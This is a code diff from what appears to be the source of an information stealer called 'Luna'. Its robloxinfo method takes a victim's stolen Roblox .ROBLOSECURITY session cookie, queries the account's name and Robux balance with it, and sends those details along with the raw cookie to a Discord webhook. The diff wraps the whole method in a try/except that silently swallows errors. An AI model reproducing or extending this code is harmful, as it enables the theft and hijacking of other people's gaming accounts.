@@ -308,25 +308,28 @@ class Discord:
                                 pass
 
     def robloxinfo(self, webhook):
-        if robo_cookie == "No Roblox Cookies Found":
-            pass
-        else:
-            embed = Embed(title="Roblox Info", color=5639644)
-            headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-            try:
-                info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
-                return info
-            except Exception:
+        try:
+            if robo_cookie == "No Roblox Cookies Found":
                 pass
-            embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
-            embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
-            embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
-            embed.set_thumbnail(url=info['ThumbnailUrl'])
+            else:
+                embed = Embed(title="Roblox Info", color=5639644)
+                headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
+                try:
+                    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+                    return info
+                except Exception:
+                    pass
+                embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
+                embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
+                embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
+                embed.set_thumbnail(url=info['ThumbnailUrl'])
 
-            webhook.send(
-                avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-                embed=embed,
-                username="Luna")
+                webhook.send(
+                    avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                    embed=embed,
+                    username="Luna")
+        except Exception:
+            pass
 
     def upload(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
